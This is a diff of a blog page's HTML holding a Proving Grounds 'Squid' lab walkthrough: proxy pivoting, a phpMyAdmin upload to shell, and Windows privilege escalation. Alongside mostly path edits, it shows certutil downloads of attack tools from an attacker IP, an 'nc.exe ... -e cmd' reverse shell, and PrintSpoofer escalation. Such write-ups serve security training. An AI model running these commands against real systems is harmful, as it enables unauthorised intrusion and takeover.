@@ -43,7 +43,7 @@
 <meta property="twitter:image" content="http://localhost:4000/../assets/img/provingrounds/oscp.png" />
 <meta property="twitter:title" content="Proving Grounds - Squid" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-07-11T00:00:00-03:00","datePublished":"2024-07-11T00:00:00-03:00","description":"Squid was a challenging box that involved utilizing a Squid proxy to discover internal services, exploiting a phpMyAdmin file upload vulnerability to gain initial access, and then escalating privileges using Windows-specific techniques.","headline":"Proving Grounds - Squid","image":"http://localhost:4000/../assets/img/provingrounds/oscp.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Proving-Grounds-Squid/"},"url":"http://localhost:4000/posts/Proving-Grounds-Squid/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-07-31T16:19:57-03:00","datePublished":"2024-07-11T00:00:00-03:00","description":"Squid was a challenging box that involved utilizing a Squid proxy to discover internal services, exploiting a phpMyAdmin file upload vulnerability to gain initial access, and then escalating privileges using Windows-specific techniques.","headline":"Proving Grounds - Squid","image":"http://localhost:4000/../assets/img/provingrounds/oscp.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Proving-Grounds-Squid/"},"url":"http://localhost:4000/posts/Proving-Grounds-Squid/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -2332,6 +2332,29 @@
 
       <!-- lastmod date -->
       
+      <span>
+        Updated
+        <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1722453597"
+  data-df="ll"
+  
+    data-bs-toggle="tooltip" data-bs-placement="bottom"
+  
+>
+  Jul 31, 2024
+</time>
+
+      </span>
+      
 
       
       
@@ -2424,12 +2447,12 @@
   <li>
     <p><code class="language-plaintext highlighter-rouge">nmap -sS -Pn -n -T4 192.168.217.189</code> -p 135,139,445,3128</p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled.png" alt="Untitled" loading="lazy"></a></p>
   </li>
   <li>
     <p><code class="language-plaintext highlighter-rouge">nmap -sVC -p 135,139,445,3128 -n -Pn 192.168.217.189 -v</code></p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%201.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%201.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%201.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%201.png" alt="Untitled" loading="lazy"></a></p>
   </li>
 </ul>
 
@@ -2443,7 +2466,7 @@
   <li>
     <p><a href="http://192.168.217.189:3128/">http://192.168.217.189:3128/</a> → Apparently the website uses <strong>squid/4.14</strong></p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%202.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%202.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%202.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%202.png" alt="Untitled" loading="lazy"></a></p>
   </li>
 </ul>
 
@@ -2459,7 +2482,7 @@
   <li>
     <p><code class="language-plaintext highlighter-rouge">curl --proxy http://192.168.217.189:3128 http://192.168.45.227</code> →  <em>Directory Listening in my own machine</em></p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%203.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%203.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%203.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%203.png" alt="Untitled" loading="lazy"></a></p>
   </li>
 </ul>
 
@@ -2469,7 +2492,7 @@
   <li>
     <p><code class="language-plaintext highlighter-rouge">python spose.py --proxy http://192.168.45.227:3128 --target 192.168.45.227</code></p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%204.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%204.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%204.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%204.png" alt="Untitled" loading="lazy"></a></p>
   </li>
 </ul>
 
@@ -2479,7 +2502,7 @@
   <li>
     <p><code class="language-plaintext highlighter-rouge">curl --proxy http://192.168.217.189:3128 http://192.168.217.189:8080</code></p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%205.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%205.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%205.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%205.png" alt="Untitled" loading="lazy"></a></p>
   </li>
 </ul>
 
@@ -2489,7 +2512,7 @@
   <li>
     <p><code class="language-plaintext highlighter-rouge">proxy swithcer</code></p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%206.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%206.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%206.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%206.png" alt="Untitled" loading="lazy"></a></p>
   </li>
 </ul>
 
@@ -2499,19 +2522,19 @@
   <li>
     <p><a href="http://192.168.237.189:8080/">http://192.168.237.189:8080/</a> → It’s a WampServer 3.2.3 - 64bit</p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%207.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%207.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%207.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%207.png" alt="Untitled" loading="lazy"></a></p>
   </li>
   <li>
     <p><a href="http://192.168.237.189:8080/phpsysinfo/index.php?disp=bootstrap">http://192.168.237.189:8080/phpsysinfo/index.php?disp=bootstrap</a></p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%208.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%208.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%208.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%208.png" alt="Untitled" loading="lazy"></a></p>
   </li>
   <li>
     <p><a href="http://192.168.237.189:8080/phpmyadmin/index.php">http://192.168.237.189:8080/phpmyadmin/index.php</a> → login panel MySQL - tried default creds (root:)</p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%209.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%209.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%209.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%209.png" alt="Untitled" loading="lazy"></a></p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%2010.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2010.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%2010.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%2010.png" alt="Untitled" loading="lazy"></a></p>
   </li>
 </ul>
 
@@ -2525,14 +2548,14 @@
   <li>
     <p><a href="http://192.168.237.189:8080/phpmyadmin/db_sql.php?db=hendrich_schema">http://192.168.237.189:8080/phpmyadmin/db_sql.php?db=hendrich_schema</a></p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%2011.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2011.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%2011.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%2011.png" alt="Untitled" loading="lazy"></a></p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%2012.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2012.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%2012.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%2012.png" alt="Untitled" loading="lazy"></a></p>
   </li>
   <li>
     <p><a href="http://192.168.237.189:8080/uploader.php">http://192.168.237.189:8080/uploader.php</a></p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%2013.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2013.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%2013.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%2013.png" alt="Untitled" loading="lazy"></a></p>
   </li>
 </ul>
 
@@ -2545,12 +2568,12 @@
   <li>
     <p><code class="language-plaintext highlighter-rouge">sudo  rlwrap nc -lvnp 80</code> → Nt authorithy</p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%2014.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2014.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%2014.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%2014.png" alt="Untitled" loading="lazy"></a></p>
   </li>
   <li>
     <p><code class="language-plaintext highlighter-rouge">flag</code></p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%2015.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2015.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%2015.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%2015.png" alt="Untitled" loading="lazy"></a></p>
   </li>
 </ul>
 
@@ -2566,18 +2589,18 @@
   <li>
     <p><code class="language-plaintext highlighter-rouge">certutil.exe -urlcache -f http://192.168.45.227/winPEASx64.exe winPEASx64.exe</code></p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%2016.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2016.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%2016.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%2016.png" alt="Untitled" loading="lazy"></a></p>
   </li>
   <li>
     <p><code class="language-plaintext highlighter-rouge">winPEASx64.exe</code> → <em>Apparently</em> <a href="https://exploit-db.com/exploits/46718">https://exploit-db.com/exploits/46718</a> <em>- CVE-2019-0836</em> <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation</a></p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%2017.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2017.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%2017.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%2017.png" alt="Untitled" loading="lazy"></a></p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%2018.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2018.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%2018.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%2018.png" alt="Untitled" loading="lazy"></a></p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%2019.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2019.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%2019.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%2019.png" alt="Untitled" loading="lazy"></a></p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%2020.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2020.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%2020.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%2020.png" alt="Untitled" loading="lazy"></a></p>
   </li>
 </ul>
 
@@ -2587,7 +2610,7 @@
   <li>
     <p><code class="language-plaintext highlighter-rouge">whoami</code></p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%2021.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2021.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%2021.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%2021.png" alt="Untitled" loading="lazy"></a></p>
   </li>
 </ul>
 
@@ -2597,18 +2620,18 @@
   <li>
     <p><code class="language-plaintext highlighter-rouge">certutil.exe -urlcache -f http://192.168.45.227/FullPowers.exe FullPowers.exe</code></p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%2022.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2022.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%2022.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%2022.png" alt="Untitled" loading="lazy"></a></p>
   </li>
   <li>
     <p><code class="language-plaintext highlighter-rouge">FullPowers.exe -c "C:\Users\Public\Documents\nc.exe 192.168.45.227 4430 -e cmd" -z</code>
 <code class="language-plaintext highlighter-rouge">sudo rlwrap nc -lvnp 4430</code></p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%2023.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2023.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%2023.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%2023.png" alt="Untitled" loading="lazy"></a></p>
   </li>
   <li>
     <p><code class="language-plaintext highlighter-rouge">whoami /priv</code> → Now i’ve SeImpersoantePrivilage enabled</p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%2024.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2024.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%2024.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%2024.png" alt="Untitled" loading="lazy"></a></p>
   </li>
 </ul>
 
@@ -2618,17 +2641,17 @@
   <li>
     <p><code class="language-plaintext highlighter-rouge">certutil.exe -urlcache -f http://192.168.45.227/PrintSpoofer64.exe PrintSpoofer64.exe</code></p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%2025.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2025.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%2025.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%2025.png" alt="Untitled" loading="lazy"></a></p>
   </li>
   <li>
     <p><code class="language-plaintext highlighter-rouge">PrintSpoofer64.exe -i -c cmd</code> → Priv escalado</p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%2026.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2026.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%2026.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%2026.png" alt="Untitled" loading="lazy"></a></p>
   </li>
   <li>
     <p><code class="language-plaintext highlighter-rouge">flag</code></p>
 
-    <p><a href="/../assets/img/oscp/Squid/Untitled%2027.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2027.png" alt="Untitled" loading="lazy"></a></p>
+    <p><a href="/../assets/img/provingrounds/Squid/Untitled%2027.png" class="popup img-link  shimmer"><img src="/../assets/img/provingrounds/Squid/Untitled%2027.png" alt="Untitled" loading="lazy"></a></p>
   </li>
 </ul>
 
@@ -2658,7 +2681,7 @@
       
       <a href="/tags/squid/" class="post-tag no-text-decoration">Squid</a>
       
-      <a href="/tags/oscp/" class="post-tag no-text-decoration">OSCP</a>
+      <a href="/tags/provingrounds/" class="post-tag no-text-decoration">provingrounds</a>
       
     </div>
     
@@ -2760,28 +2783,21 @@
         
         
         <li class="text-truncate lh-lg">
-          <a href="/posts/Attacking-Serialization/">Understanding Attack Serialization: An Introduction</a>
+          <a href="/posts/Proving-Grounds-Fractal/">Proving Grounds - Fractal</a>
         </li>
       
         
         
         
         <li class="text-truncate lh-lg">
-          <a href="/posts/Proving-Grounds-ClamAV/">Proving Grounds - ClamAV</a>
+          <a href="/posts/Proving-Grounds-Squid/">Proving Grounds - Squid</a>
         </li>
       
         
         
         
         <li class="text-truncate lh-lg">
-          <a href="/posts/Hack-The-Box-Conceal/">Hack The Box - Conceal</a>
-        </li>
-      
-        
-        
-        
-        <li class="text-truncate lh-lg">
-          <a href="/posts/Hack-The-Box-Surveillance/">Hack The Box - Surveillance</a>
+          <a href="/posts/Proving-Grounds-Twiggy/">Proving Grounds - Twiggy</a>
         </li>
       
         
@@ -2789,6 +2805,13 @@
         
         <li class="text-truncate lh-lg">
           <a href="/posts/Proving-Grounds-Exfiltrated/">Proving Grounds - Exfiltrated</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/Proving-Grounds-ClamAV/">Proving Grounds - ClamAV</a>
         </li>
       
     </ul>
